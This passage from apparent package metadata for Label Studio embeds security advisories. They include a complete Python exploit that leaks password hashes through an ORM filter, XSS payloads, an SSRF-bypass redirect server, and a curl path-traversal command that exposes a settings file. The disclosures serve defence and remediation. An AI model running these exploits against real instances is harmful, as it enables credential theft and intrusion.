...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.5.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.5.post1/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.19)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.5.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d03ce90f68108ca85cc4afd97daabf7baefbf87cc6a788d91fe108660f8777f1","md5":"2699c2d985ef7e2cfdf56c2123fadbe9","sha256":"0fd87d4f011c73dc890a859588f7090596a28911ae69aa5f9cba983331a91423"},"downloads":-1,"filename":"label_studio-0.7.5-2-py3-none-any.whl","has_sig":false,"md5_digest":"2699c2d985ef7e2cfdf56c2123fadbe9","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157420,"upload_time":"2020-10-14T18:14:56","upload_time_iso_8601":"2020-10-14T18:14:56.795306Z","url":"https://files.pythonhosted.org/packages/d0/3c/e90f68108ca85cc4afd97daabf7baefbf87cc6a788d91fe108660f8777f1/label_studio-0.7.5-2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"47498392c81a21b8aadeff5469cd86778d5c2b84e50a425f8f51b7c7d01bb54f","md5":"1d8b4698a959aa512ceb42c5a074ec0d","sha256":"d6a4ce36186ec1a68a637e33865fc588f6f0e59cc999138ed4729efd53adebf6"},"downloads":-1,"filename":"label_studio-0.7.5-3-py3-none-any.whl","has_sig":false,"md5_digest":"1d8b4698a959aa512ceb42c5a074ec0d","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157420,"upload_time":"2020-10-14T18:20:01","upload_time_iso_8601":"2020-10-14T18:20:01.167473Z","url":"https://files.pythonhosted.org/packages/47/49/8392c81a21b8aadeff5469cd86778d5c2b84e50a425f8f51b7c7d01bb54f/label_studio-0.7.5-3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"235e8b4cdb9d278d93ed559581d028b7fb2ed2cd04063c42890e7a86ede128f9","md5":"0fd0d2d0221cfa5f2eb9a50f3f48f4bd","sha256":"a21573f7a3eadd072df8909150309a3958cd03786c7f7a23f1a42006e95ed175"},"downloads":-1,"filename":"label_studio-0.7.5-5-py3-none-any.whl","has_sig":false,"md5_digest":"0fd0d2d0221cfa5f2eb9a50f3f48f4bd","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157420,"upload_time":"2020-10-14T18:22:46","upload_time_iso_8601":"2020-10-14T18:22:46.891030Z","url":"https://files.pythonhosted.org/packages/23/5e/8b4cdb9d278d93ed559581d028b7fb2ed2cd04063c42890e7a86ede128f9/label_studio-0.7.5-5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"89509da1a58e1e090361b548c68e98e791f683a46137d073837041a8e852e3da","md5":"13818a9bcc28680f7fc9e158706b3d4f","sha256":"7f1332ef0f43cea2da0f0af14a5ccb607da7e4ec5ea4793235681fc4f692532c"},"downloads":-1,"filename":"label_studio-0.7.5.post0-7-py3-none-any.whl","has_sig":false,"md5_digest":"13818a9bcc28680f7fc9e158706b3d4f","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157420,"upload_time":"2020-10-14T18:34:02","upload_time_iso_8601":"2020-10-14T18:34:02.611502Z","url":"https://files.pythonhosted.org/packages/89/50/9da1a58e1e090361b548c68e98e791f683a46137d073837041a8e852e3da/label_studio-0.7.5.post0-7-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8a847fe4858f5b47e167519a6ceef74f70917c23a7ac7e7a92eeed57d5b631c8","md5":"a700f9bfbb027aaad1a7a45bf2511975","sha256":"0d2d69a89339bb3d745450ff356f69dabfbbfce52b3992e1e2b232c5548a143b"},"downloads":-1,"filename":"label_studio-0.7.5.post1-py3-none-any.whl","has_sig":false,"md5_digest":"a700f9bfbb027aaad1a7a45bf2511975","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157421,"upload_time":"2020-10-14T17:55:25","upload_time_iso_8601":"2020-10-14T17:55:25.032357Z","url":"https://files.pythonhosted.org/packages/8a/84/7fe4858f5b47e167519a6ceef74f70917c23a7ac7e7a92eeed57d5b631c8/label_studio-0.7.5.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d117b09e5f6d7a3f897dcc5401ac30f2a4eeebb9c73104fafbe9d078db0fcaee","md5":"e0e16ea0f4e94f5b8ff9979661c88caf","sha256":"373e2a960a01f04e472247006dbbd2fb27dc0f260577b60f4bbf693d97618e99"},"downloads":-1,"filename":"label-studio-0.7.5.post1.tar.gz","has_sig":false,"md5_digest":"e0e16ea0f4e94f5b8ff9979661c88caf","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":10097994,"upload_time":"2020-10-14T17:55:34","upload_time_iso_8601":"2020-10-14T17:55:34.150213Z","url":"https://files.pythonhosted.org/packages/d1/17/b09e5f6d7a3f897dcc5401ac30f2a4eeebb9c73104fafbe9d078db0fcaee/label-studio-0.7.5.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against 